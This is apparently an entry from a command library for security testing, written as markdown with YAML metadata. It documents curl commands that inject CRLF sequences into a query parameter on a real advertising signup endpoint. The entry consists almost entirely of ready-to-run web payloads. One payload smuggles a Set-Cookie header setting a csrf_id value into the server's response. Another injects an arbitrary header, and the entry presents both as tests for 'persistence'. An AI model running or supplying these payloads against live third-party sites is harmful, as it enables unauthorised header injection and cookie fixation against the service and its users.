---
data: >-
  curl -i
  'https://ads.twitter.com/subscriptions/mobile/signup?ref=en-btc-help-twitter-promote-mode-header%0d%0aSet-Cookie:csrf_id=test%3b%20Path=/%3b'
tags:
  - crlf-injection
  - variation-test
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e965685e-4a0d-42a1-baef-15b53b6d5396
created_at: '2025-12-11T06:10:15.993Z'
updated_at: '2025-12-11T06:10:15.993Z'
verified: false
validated: true
submitted: true
---
# curl-variation-test

## Command

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/signup?ref=en-btc-help-twitter-promote-mode-header%0d%0aSet-Cookie:csrf_id=test%3b%20Path=/%3b'
```

## Description

This command tests a variation of CRLF injection on a different endpoint to check persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| URL | Variant endpoint with injection | Yes |

## Examples

### Basic Usage

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/signup?ref=en-btc-help-twitter-promote-mode-header%0d%0aSet-Cookie:csrf_id=test%3b%20Path=/%3b'
```

### Advanced Usage

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/intro?ref=%0d%0atest:tested'
```

## Expected Output

Injected headers in response for vulnerable variations.

## Related

- [[commands/curl-set-cookie-injection]]
- [[procedures/Test-Persistence-and-Variations]]
